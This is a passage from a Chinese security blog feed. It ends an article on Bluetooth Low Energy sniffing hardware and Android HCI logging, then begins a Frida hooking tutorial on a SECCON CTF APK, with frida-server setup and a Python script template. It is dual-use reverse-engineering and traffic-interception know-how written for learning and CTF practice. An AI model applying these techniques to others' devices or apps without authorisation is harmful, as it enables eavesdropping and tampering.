src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg" alt="img"></a></p><p>优点：</p><ul><li>价格便宜，USB Dongle淘宝价70元左右，整套开发板售价约200软妹币上下</li><li>无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪</li><li>官方提供的BLE Sniffer程序可配合Wireshark工具对嗅探到的低功耗蓝牙数据包进行解析，能够很直观的显示出内部的层级关系和各字段含义</li></ul><p>缺点：</p><ul><li>不用指定广播信道，确实操作起来比较方便，但与之相对的是经常无法抓到后面的通信数据包。无论是作为开发用的调试工具，还是分析用的嗅探工具，都不够理想</li></ul><h5 id><a href="#" class="headerlink" title></a></h5><h3 id="2-商业侦听工具"><a href="#2-商业侦听工具" class="headerlink" title="2. 商业侦听工具"></a>2. 商业侦听工具</h3><h4 id="a-Frontline-BPA®-600"><a href="#a-Frontline-BPA®-600" class="headerlink" title="a. Frontline BPA® 600"></a>a. Frontline BPA® 600</h4><p>Frontline Test Equipment——“前线测试设备”（简称“前线”，Frontline），主要是针对各种各样的协议所做的一个“协议分析器”。“前线”系统的销售策略是“卖硬件，送软件”，而软件自然是和硬件相关联的，其侦听范围包括SCADA系统、RS-232串口通信、Ethernet以太网通信、ZigBee网络通信，以及蓝牙网络技术。Frontline旗下的BPA® 600双模蓝牙协议分析仪，能够把从空中获取到的基础速率/ 增强数据速率（BR/EDR）的传统蓝牙无线通信和低功耗蓝牙无线通信数据同时直观的显示出来。</p><p><a href="https://user-images.githubusercontent.com/11291711/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg" alt="img"></a></p><p>优点：</p><ul><li>无角色指定链路抓取意味着在初始化设置时不再需要指定哪个设备是主设备（master），哪个设备是从设备（slave）</li><li>能够同时可视化的监视低功耗蓝牙技术所使用的三个广播信道</li><li>同时抓取和解密多条蓝牙链路</li><li>链路密钥可自动从第三方软件或调试工具导入到BPA 600</li><li>支持蓝牙SIG组织发布的所有的协议和应用层协议，完全支持蓝牙4.1版本</li></ul><p>缺点：</p><ul><li>十分昂贵，<a href="http://www.fte.com/">官网</a>上虽并未公布具体的价格信息，需要与对方进行联系，但淘宝价格在15万左右</li><li>需要捕获到蓝牙的“连接建立”过程，对于已经建立好连接的蓝牙网络，无法从一个正在处理的进程中，嗅探到这个“微微网”里面的通信数据包</li></ul><h4 id="b-Ellisys-BEX400"><a href="#b-Ellisys-BEX400" class="headerlink" title="b. Ellisys BEX400"></a>b. Ellisys BEX400</h4><p>Ellisys公司的BLuetooth Explorer 400（简称“BEX400”），是个独特的蓝牙数据通信捕获系统。它使用了一个wideband的接收器，能够同时侦听蓝牙整个79MHz的所有频谱。通过这种无线接入方法，嗅探蓝牙数据包以及对蓝牙活动的评估变得很容易。在BEX400强大的宽带接收能力支持下，我们能够同时捕获蓝牙的所有活动，且无需指定“蓝牙设备地址”信息。此外，该设备在捕获一个“微微网”中的蓝牙通信数据时，既可以是在连接建立前，也可以在连接建立后</p><p><a href="https://user-images.githubusercontent.com/11291711/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png" alt="img"></a></p><p>优点：</p><ul><li>对于BLE的流量捕获没有必须在建立连接前就开始嗅探的限制</li><li>能够同时侦听蓝牙的所有信道，且无需指定“蓝牙设备地址”信息</li></ul><p>缺点：</p><ul><li>价格极其昂贵</li><li>除价格外，几乎完全符合需求，暂未发现明显缺点</li></ul><h3 id="3-开源侦听工具Ubertooth"><a href="#3-开源侦听工具Ubertooth" class="headerlink" title="3. 开源侦听工具Ubertooth"></a>3. 开源侦听工具Ubertooth</h3><p>“超牙项目”（Project Ubertooth）是一个开源的硬件项目，由Great Scott Gadgets团队的Michael Ossmann开发。超牙的硬件系统，目前处于版本为1的阶段，称为“超牙一号”（Ubertooth One）。通过这个工具，可以创建属于自己的“传统蓝牙”和“低功耗蓝牙”底层通信数据包捕获工具。</p><p><a href="https://user-images.githubusercontent.com/11291711/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg" alt="img"></a></p><p>此外，Ubertooth的固件源代码，可以直接从github：<a href="https://github.com/greatscottgadgets/ubertooths">https://github.com/greatscottgadgets/ubertooth</a>下载到最新的发布版。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200928121643528.png" alt="image-20200928121643528"></p><p>优点：</p><ul><li>售价约120美元，比较亲民</li><li>本身是一个开源的硬件和软件工程，其设计目的就是用来进行蓝牙网络的嗅探，便于研究员和黑客使用</li><li>针对不同的蓝牙规范，具有不同的应对工具，支持传统蓝牙和低功耗蓝牙两种数据包的捕获</li><li>能够在混杂模式下进行跟踪，通过ubertooth-btle程序对捕获的数据包进行识别和匹配，进而确定“访问地址”、“循环冗余校验”初始值、“跳转间隔”、“跳转增量”等，并还原出数据包的值</li></ul><p>缺点：</p><ul><li>说是支持“传统蓝牙”，但其实只能捕获“基本速率蓝牙”在网络中的活动，并不支持后来的“增强速率蓝牙”在规范改进后的设备。不过这与我们的工作没有太大联系，主要关注的应是低功耗蓝牙</li></ul><h2 id="0x08-移动端工具"><a href="#0x08-移动端工具" class="headerlink" title="0x08 移动端工具"></a>0x08 移动端工具</h2><h3 id="1-Android手机抓取app蓝牙数据"><a href="#1-Android手机抓取app蓝牙数据" class="headerlink" title="1. Android手机抓取app蓝牙数据"></a>1. Android手机抓取app蓝牙数据</h3><h4 id="a-Android蓝牙HCI日志"><a href="#a-Android蓝牙HCI日志" class="headerlink" title="a .Android蓝牙HCI日志"></a><strong>a .Android蓝牙HCI日志</strong></h4><p>在部分Android机型为开发人员提供了保存蓝牙日志的选项，即可保存手机向设备发送的数据和设备响应的数据，打开方式如下：</p><p>开发者模式→蓝牙HCI日志</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930155140338.png" alt="image-20200930155140338"></p><p>不同的平台存放HCI log的路径会不一样，MTK存放HCI log的路径为<code>/sdcard/mtklog/btlog/btsnoop_hci.log</code>，高通的存放路径为<code>/sdcard/btsnoop_hci.log</code></p><p>如果上面提到的路径下都没有HCI log，还可以通过手机上的蓝牙配置文件<code>bt_stack.conf</code>来查看路径</p><p><code>bt_stack.conf</code>位于<code>/etc/bluetooth/路径下，HCI log路径通过</code>BtSnoopFileName=/sdcard/btsnoop_hci.log`来进行设置的</p><p>另外如果没有<code>bt_stack.conf</code>文件，设备也会在默认路径下生成日志：<code>/data/misc/bluetooth/logs/btsnoop_hci.log</code></p><p>之后导出到wireshark查看即可，如图清晰的展示了蓝牙各协议栈的内容，分析时候重点关注发送的数据内容即<code>Handle</code>、<code>uuid</code>、<code>Value</code>等值即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49418350-b6590600-f7bc-11e8-8cea-fbd09c9c318c.png" alt="img"></p><h4 id="b-Bluez调试工具hcidump"><a href="#b-Bluez调试工具hcidump" class="headerlink" title="b. Bluez调试工具hcidump"></a><strong>b. Bluez调试工具hcidump</strong></h4><p>虽然Android 4.2已经将蓝牙协议栈替换为Bluedroid，但仍可使用BlueZ调试工具（需自行编译，或网上下载），且hcidump输出的数据与<code>开发者模式</code>里的<code>蓝牙HCI日志</code>基本一样，源码如下：</p><p><a href="https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1">https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1</a></p><p>hcidump抓取 log :</p><ul><li>打开蓝牙</li><li>用adb shell 登陆android设备 并且用 <code>hcidump -w /sdcard/hcilog</code></li><li>开始测试</li><li>测试完成，停止hcidump</li><li>导出到wireshark分析 <code>hcilog</code> 文件</li></ul><h3 id="2-扫描器"><a href="#2-扫描器" class="headerlink" title="2. 扫描器"></a>2. 扫描器</h3><h4 id="a-LightBlue"><a href="#a-LightBlue" class="headerlink" title="a. LightBlue"></a>a. LightBlue</h4><p><code>LightBlue</code>使用简单，打开蓝牙和app，即自动扫描蓝牙设备，未连接之前，大部分设备都是<code>Unnamed</code>和<code>No services</code>，选择其中一个会尝试连接，连接成功后即可获取蓝牙设备的设备信息、UUID、服务等信息了，选择其中一个服务，还可以尝试对其读写数据</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161720845.png" alt="image-20200930161720845"></p><h4 id="b-nRF-Connect"><a href="#b-nRF-Connect" class="headerlink" title="b. nRF Connect"></a>b. nRF Connect</h4><p><code>nRF Connect</code>的使用方式和<code>LightBlue</code>基本一致，优点在于对设备服务信息展示更为直观：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161645370.png" alt="image-20200930161645370"></p><h2 id="0x09-针对利用蓝牙的应用攻击（私有协议）"><a href="#0x09-针对利用蓝牙的应用攻击（私有协议）" class="headerlink" title="0x09 针对利用蓝牙的应用攻击（私有协议）"></a>0x09 针对利用蓝牙的应用攻击（私有协议）</h2><p>目前针对私有协议的分析基本都是通过蓝牙dongle抓包例如CC2540，并且逆向app进行分析应用实现是否安全。</p><ul><li><a href="http://drops.xmd5.com/static/drops/tips-10109.html">YeeLight 2 代蓝牙灯泡，小爱爱智能跳蛋，小米手环</a></li><li><a href="https://future-sec.com/how-to-crack-a-ble-lock.html">如何破解一个蓝牙锁</a></li><li><a href="http://www.droidsec.cn/ble安全入门及实战（1）/">BLE安全入门及实战（1）</a></li><li><a href="https://www.secpulse.com/archives/75963.html">BLE安全入门及实战（2）</a></li><li><a href="https://www.secpulse.com/archives/76377.html">BLE安全入门及实战（3）</a></li><li><a href="https://blog.csdn.net/u013183495/article/details/51736605">体脂秤</a></li></ul><h2 id="0x10-可以研究的点"><a href="#0x10-可以研究的点" class="headerlink" title="0x10 可以研究的点"></a>0x10 可以研究的点</h2><p>经过多年的历史发展，蓝牙本身已经变成一个比较复杂的协议了，如果需要整理完整的攻击面需要对整个蓝牙的实现有很清晰的梳理，网上大部分的文章都是关于协议本身的，对于协议的实现还是说的不是很清楚。而且协议本身的发展方向就是IOT方向，例如GATT这种很明显就是支持物联网设备的协议。所以搞清BLE5.0在真实的物联网设备上的架构以及实现我认为非常关键。</p><h2 id="0x11-参考链接"><a href="#0x11-参考链接" class="headerlink" title="0x11 参考链接"></a>0x11 参考链接</h2><p><a href="https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/">https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/</a></p><p><a href="http://www.gandalf.site/2019/02/ble.html">http://www.gandalf.site/2019/02/ble.html</a></p><p><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-10109.html">http://drops.xmd5.com/static/drops/tips-10109.html</a></p><p><a href="https://blog.csdn.net/u013183495/article/details/51736605">https://blog.csdn.net/u013183495/article/details/51736605</a></p><p><a href="https://www.secpulse.com/archives/75963.html">https://www.secpulse.com/archives/75963.html</a></p><h2 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…"></a>更新中…</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;放大佬总结的一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/BLE%E5%AE%89%E5%85%A8.png&quot; alt=&quot;BLE安全&quot;&gt;&lt;/p&gt;
&lt;p&gt;蓝牙是一种无线通信标准，工作
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="BLE" scheme="http://www.ol4three.com/tags/BLE/"/>
    
      <category term="蓝牙" scheme="http://www.ol4three.com/tags/%E8%93%9D%E7%89%99/"/>
    
  </entry>
  
  <entry>
    <title>Hook框架Firada</title>
    <link href="http://www.ol4three.com/2020/09/22/Android/Hook%E6%A1%86%E6%9E%B6Firada/"/>
    <id>http://www.ol4three.com/2020/09/22/Android/Hook%E6%A1%86%E6%9E%B6Firada/</id>
    <published>2020-09-22T03:53:39.000Z</published>
    <updated>2020-12-04T12:15:40.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Frida是个轻量级别的hook框架</p><p><strong>是Python API，但JavaScript调试逻辑</strong></p><p>Frida的核心是用C编写的，并将<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdevelopers.google.com%2Fv8%2F">Google的V8引擎</a>注入到目标进程中，在这些进程中，JS可以完全访问内存，挂钩函数甚至调用进程内的本机函数来执行。</p><p>使用Python和JS可以使用无风险的API进行快速开发。Frida可以帮助您轻松捕获JS中的错误并为您提供异常而不是崩溃。<br> 。<br> 关于frda学习路线了，Frida的学习还是蛮简单的，只需要了解两方面的内容：<br> 1）主控端和目标进程的交互（message）<br> 2）Python接口和js接口（查文档）</p><p>frida框架分为两部分：<br> 1）一部分是运行在系统上的交互工具frida CLI。<br> 2）另一部分是运行在目标机器上的代码注入工具 frida-serve。</p><h2 id="0x01-资源和环境"><a href="#0x01-资源和环境" class="headerlink" title="0x01 资源和环境"></a>0x01 资源和环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure><h2 id="0x02-运行模式"><a href="#0x02-运行模式" class="headerlink" title="0x02 运行模式"></a>0x02 运行模式</h2><p>Frida通过其强大的仪器核心Gum提供动态检测，Gum是用C语言编写的。因为这种检测逻辑很容易发生变化，所以通常需要用脚本语言编写，这样在开发和维护它时会得到一个简短的反馈循环。这就是GumJS发挥作用的地方。只需几行C就可以在运行时内运行一段JavaScript，它可以完全访问Gum的API，允许您挂钩函数，枚举加载的库，导入和导出的函数，读写内存，扫描模式的内存等</p><h2 id="0x03-Frida安装"><a href="#0x03-Frida安装" class="headerlink" title="0x03 Frida安装"></a>0x03 Frida安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922142344067.png" alt="image-20200922142344067"></p><p>安卓端安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143332932.png" alt="image-20200922143332932"></p><p>看到我的cpu是armv8 64位的 所以对应的去下载相应的版本</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143734995.png" alt="image-20200922143734995"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-12.11.17-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod 777 frida-server-12.11.17-android-arm64</span><br><span class="line">.&#x2F;frida-server-12.11.17-android-arm64</span><br></pre></td></tr></table></figure><p>在bash下frida-ps -U</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922144633734.png" alt="image-20200922144633734"></p><h2 id="0x04-Hook示例的安装与分析"><a href="#0x04-Hook示例的安装与分析" class="headerlink" title="0x04 Hook示例的安装与分析"></a>0x04 Hook示例的安装与分析</h2><p>Frida官网给我们了一个ctf的示例，就以此为例子，开始学习frida在android逆向的使用。<br>rps.apk <a href="https://github.com/ctfs/write-ups-2015/raw/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1/rps.apk">下载地址</a></p><p>使用虚拟机或者自己的手机将应用安装好，发现是一个简单的石头剪刀布的游戏应用，简单的玩了一下，没什么特别的，直接分析代码吧，看看到底想干什么。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103121714.png" alt="image-20200923103121714"></p><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>使用jadx-gui反编译，发现app没有加壳和混淆，当然一来就加壳和混淆的话对我们就太不友好了，接下分析就简单了，直接看java代码。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103824726.png" alt="image-20200923103824726"></p><p>在MainActivity中找到OnCreate()方法，可以看到只是简单的声明了button控件以及对应的监听器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">  super.onCreate(paramBundle);</span><br><span class="line">  setContentView(2130968600);</span><br><span class="line">  this.P &#x3D; (Button)findViewById(2131492941);</span><br><span class="line">  this.S &#x3D; (Button)findViewById(2131492943);</span><br><span class="line">  this.r &#x3D; (Button)findViewById(2131492942);</span><br><span class="line">  this.P.setOnClickListener(this);</span><br><span class="line">  this.r.setOnClickListener(this);</span><br><span class="line">  this.S.setOnClickListener(this);</span><br><span class="line">  this.flag &#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续查看button的onclick方法，可以看出cpu是通过随机数组出的，其判断输赢的方法在this.showMessageTask中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View paramView) &#123;</span><br><span class="line">   if (this.flag &#x3D;&#x3D; 1)</span><br><span class="line">     return; </span><br><span class="line">   this.flag &#x3D; 1;</span><br><span class="line">   ((TextView)findViewById(2131492946)).setText(&quot;&quot;);</span><br><span class="line">   TextView textView1 &#x3D; (TextView)findViewById(2131492944);</span><br><span class="line">   TextView textView2 &#x3D; (TextView)findViewById(2131492945);</span><br><span class="line">   this.m &#x3D; 0;</span><br><span class="line">   this.n &#x3D; (new Random()).nextInt(3);&#x2F;&#x2F;随机数0，1，2</span><br><span class="line">   int i &#x3D; this.n;</span><br><span class="line">   (new String[3])[0] &#x3D; &quot;CPU: Paper&quot;;</span><br><span class="line">   (new String[3])[1] &#x3D; &quot;CPU: Rock&quot;;</span><br><span class="line">   (new String[3])[2] &#x3D; &quot;CPU: Scissors&quot;;</span><br><span class="line">   textView2.setText((new String[3])[i]);</span><br><span class="line">   if (paramView &#x3D;&#x3D; this.P) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Paper&quot;);</span><br><span class="line">     this.m &#x3D; 0;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.r) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Rock&quot;);</span><br><span class="line">     this.m &#x3D; 1;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.S) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Scissors&quot;);</span><br><span class="line">     this.m &#x3D; 2;</span><br><span class="line">   &#125; </span><br><span class="line">   this.handler.postDelayed(this.showMessageTask, 1000L);&#x2F;&#x2F;输赢判断方法</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>跟进分析showMessageTask，可以看到如果赢了mainActivity.cnt会+1，但是一旦输了cnt就会置0，而获取flag的要求是我们得获胜1000次，…… :(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">      TextView textView &#x3D; (TextView)MainActivity.this.findViewById(2131492946);</span><br><span class="line">      if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">        textView.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; </span><br><span class="line">      if (1000 &#x3D;&#x3D; MainActivity.this.cnt)</span><br><span class="line">        textView.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;); </span><br><span class="line">      MainActivity.this.flag &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>简单分析一下获取flag需要的条件，总结有3个办法:</p><ol><li>分析calc()方法能算出答案，但这个方法在so中，得分析汇编代码才行，当然可以尝试使用ida pro，F5查看C代码分析，前提是算法不难。</li><li>获取calc函数的返回值，从而计算答案。</li><li>还有一个方法就是，直接将MainActivity.this.cnt的值构造成1000。</li></ol><p>接下来就用frida，使用后两种思路来解这个简单的示例。但在这之前得先了解Frida自带的Messages机制，了解frida怎么从通过一个python脚本发送和接收message消息是一个提升理解frida的好方法。</p><h2 id="0x04-Frida自带的Messages机制与进程交互"><a href="#0x04-Frida自带的Messages机制与进程交互" class="headerlink" title="0x04 Frida自带的Messages机制与进程交互"></a>0x04 Frida自带的Messages机制与进程交互</h2><p>先来看看一个Messages的模板，这里用到的语言分别是python和javascript，他们之间的关系是python作为载体，javascript作为在android中真正执行代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#hook代码，采用javascript编写</span></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">//javascript代码，重点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#自定义回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重点的4行代码</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">&#x27;应用完整包名&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>当然如果是对此简单的使用，只需要编写jscode，以及填写你要hook的应用完整包名就行了，不过如果单纯只会用可能在以后会被模板限制，所以一探究竟还是很有必要。<br>可以在Bash中，使用python终端的help()函数找到frida库的源代码的绝对路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import frida</span><br><span class="line">help(frida)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923112932246.png" alt="image-20200923112932246"></p><p>接下来就来具体看看这几句代码做了什么事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;应用完整包名&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>首先使用了frida.get_usb_device()，返回了一个_get_device函数，跟进_get_device方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def get_usb_device(timeout &#x3D; 0):</span><br><span class="line">    return _get_device(lambda device: device.type &#x3D;&#x3D; &#39;tether&#39;, timeout)</span><br></pre></td></tr></table></figure><p>在_get_device中，通过get_device_manager()实例化DeviceManager类，并调用该类中的enumerate_devices()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def _get_device(predicate, timeout):</span><br><span class="line">    mgr &#x3D; get_device_manager()                &#x2F;&#x2F;获取设备管理</span><br><span class="line">    def find_matching_device():               &#x2F;&#x2F;寻找匹配设备</span><br><span class="line">        usb_devices &#x3D; [device for device in mgr.enumerate_devices() if predicate(device)]</span><br><span class="line">        if len(usb_devices) &gt; 0:</span><br><span class="line">            return usb_devices[0]</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line">    device &#x3D; find_matching_device()</span><br><span class="line">   ...省略</span><br></pre></td></tr></table></figure><p>get_device_manager()代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 